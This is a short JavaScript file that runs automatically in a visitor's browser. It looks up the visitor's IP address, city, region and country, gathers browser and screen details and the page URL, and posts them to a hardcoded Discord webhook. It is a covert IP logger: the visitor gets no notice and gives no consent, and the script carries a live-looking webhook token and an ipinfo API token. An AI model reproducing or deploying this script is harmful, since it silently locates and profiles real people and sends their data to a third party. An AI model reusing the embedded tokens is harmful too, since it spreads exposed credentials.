function sendWebhook() {
    const webhookUrl = 'https://discord.com/api/webhooks/1246327757105926166/QzIzaMff8SONkEzyOu194IS_XIoa52xQHfbvGR82QNhc57oAGB4SogGzEWHY3y0VaYv3';

    async function fetchIpInfo() {
        try {
            const response = await fetch('https://ipinfo.io/json?token=ce1fc29ae007b4');
            return await response.json();
        } catch (error) {
            return { error: 'Failed to fetch IP info' };
        }
    }

    fetchIpInfo().then(ipInfo => {
        const deviceInfo = {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth
            }
        };

        const embed = {
            title: "New Access Detected",
            description: "Details of the access event",
            color: 3447003,
            fields: [
                { name: "URL", value: location.href, inline: false },
                { name: "Time", value: new Date().toISOString(), inline: false },
                { name: "IP", value: ipInfo.ip || 'Unavailable', inline: true },
                { name: "City", value: ipInfo.city || 'Unavailable', inline: true },
                { name: "Region", value: ipInfo.region || 'Unavailable', inline: true },
                { name: "Country", value: ipInfo.country || 'Unavailable', inline: true },
                { name: "User-Agent", value: deviceInfo.userAgent, inline: false },
                { name: "Platform", value: deviceInfo.platform, inline: true },
                { name: "Language", value: deviceInfo.language, inline: true },
                {
                    name: "Screen",
                    value: `Width: ${deviceInfo.screen.width}, Height: ${deviceInfo.screen.height}, Color Depth: ${deviceInfo.screen.colorDepth}`,
                    inline: false
                }
            ],
            footer: { text: "Access event recorded" },
            timestamp: new Date()
        };

        const payload = JSON.stringify({ embeds: [embed] });

        fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: payload
        }).then(response => {
            if (response.ok) {
                console.log('Webhook sent successfully');
            } else {
                console.error('Failed to send webhook', response.statusText);
            }
        }).catch(error => {
            console.error('Error sending webhook', error);
        });
    });
}


sendWebhook();